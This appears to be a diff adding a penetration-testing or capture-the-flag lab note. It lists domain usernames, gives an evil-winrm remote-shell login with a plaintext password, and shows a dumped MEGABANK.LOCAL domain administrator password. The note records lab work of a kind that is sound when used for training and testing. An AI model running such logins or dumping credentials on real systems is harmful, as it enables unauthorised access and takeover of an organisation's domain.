@@ -1,0 +1,16 @@
+Guest
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+
+./evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$"
+megabank\administrator S-1-5-21-391775091-850290835-3566037492-500
+[+] Domain:  MEGABANK.LOCAL
+[+] Username: administrator
+[+]Password: d0m@in4dminyeah!
